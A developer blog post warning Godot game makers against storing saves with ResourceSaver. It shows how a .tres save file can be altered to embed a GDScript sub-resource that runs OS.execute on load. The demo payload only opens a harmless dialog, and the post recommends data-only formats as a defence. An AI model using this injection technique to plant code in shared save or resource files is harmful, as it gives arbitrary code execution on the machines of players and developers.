---
title: Don't save Resources to user://
date: 2026-05-09
category: godot
---

I don't save stuff in Godot very often. That's how I ended up on [Saving games][saving] page of the docs. In the end of the page, there was a heated discussion about using `ResourceSaver` instead of saving to JSON, as the article suggests.

I knew about `ResourceSaver`, I used it for my jam project when I was desperate for any way to save progress with minimal amount of code. It worked, but even then I felt uncomfortable to save player's data in an internal format. I thought that in a game of a bigger scale, it would be unwise to use a format that can, most probably, will be changed in the future by the engine's development team.

Turns out, migrations are the least significant concern compared to what I learnt from the discussion. What if I told you that a save file implemented with `ResourceSaver` could steal your money, erase your files and, even worse, turn your wallpaper upside-down? Yes, I'm talking about arbitrary code execution.

## How does it work?

It takes surprisingly little effort to execute arbitrary code in a game that loads resources from disk. Suppose you have a custom resource:

```gdscript
class_name SaveFile
extends Resource

@export var lives: int

func _init(p_lives: int) -> void:
	lives = p_lives
```

And somewhere in the code of your game, you save it:

```gdscript
var save_data: SaveFile

func _ready() -> void:
	save_data = SaveFile.new(3)
	ResourceSaver.save(save_data, "user://save.tres")
```

If you open your save file with a text editor, it looks like this:

```
[gd_resource type="Resource" script_class="SaveFile" format=3]

[ext_resource type="Script" path="res://save_file.gd" id="1_dw8s2"]

[resource]
script = ExtResource("1_dw8s2")
lives = 3
```

There are 2 changes you need to make to execute arbitrary code. First, add a sub-resource that contains a script. This script can do absolutely anything, mine will show a little dialog message using an external program.

```
[sub_resource type="GDScript" id="1"]
script/source = "extends Resource; func _init(): OS.execute('kdialog', ['--yesno', 'Been pwned lately?', '--no-label', 'Hell yes!'])"
```

Now we need a way to execute the code. Notice how we use `_init` function here, it's called every time the resource is loaded. Changing `script` property of `[resource]` will do it:

```
[resource]
script = SubResource("1")
```

That's all! Full compromised save file file looks like this:

```
[gd_resource type="Resource" script_class="SaveFile" format=3]

[ext_resource type="Script" path="res://save_file.gd" id="1_dw8s2"]

[sub_resource type="GDScript" id="1"]
script/source = "extends Resource; func _init(): OS.execute('kdialog', ['--yesno', 'Been pwned lately?', '--no-label', 'Hell yes!'])"

[resource]
script = SubResource("1")
lives = 3
```

And it works! You don't even need to do anything besides loading the file. So every time your game does:

```gdscript
ResourceLoader.load("user://save.tres")
```

You'll see the message:

{{< figure src="message.png"
    alt="A dialog window that asks 'Have you been pwned lately?' and two buttons: 'Yes' and 'Hell yes!'"
    caption="Yes!">}}

## Why should I care?

Now you know how it works, you may still be confused about why anyone would care. Let me give you several reasons:

1. People share save files with each other. And they download save files from the internet. In my opinion, it's reasonable to assume that save file is pure data and can't execute code. Resources can, which makes it a wrong format for the job.
2. People share save files with you, the developer. If you accept bug reports, you may want players to provide save files to save time reproducing them. And you don't want to execute someone's arbitrary code on your development machine.
3. Your game may become popular, even if you think it won't. My most popular game on itch is the one I least expected to be popular. You may ask anyone who is serious about being creative in the internet, most of them have a story of the most low-effort thing becoming viral. And you don't want a serious exploit in a popular game.
4. Even if you only make web games which are not vulnerable to this exploit, there is a non-zero chance of you porting one of your games to PC. Or, if you decide to create a PC game later, it's better to have a habbit of saving games in a data-only format.

The argument I see a lot in favor of using resources for save files is that it's easy, just `ResourceSaver.save` and `ResourceLoader.load`, and you don't need to think about anything. And that's fair! It's a shame that Godot does not provide an easy way to save an arbitrary object. It takes time and mental energy to deal with different types of data, in JSON even numbers are tricky it treats all numbers as floats. And when you're faced with doing your own serialization versus just using a single function that looks so legit and so easy, it's understandable to prefer the easier approach.

But sometimes, the easier is wrong. Better stick to what [docs][saving] suggest.

[saving]: https://docs.godotengine.org/en/stable/tutorials/io/saving_games.html
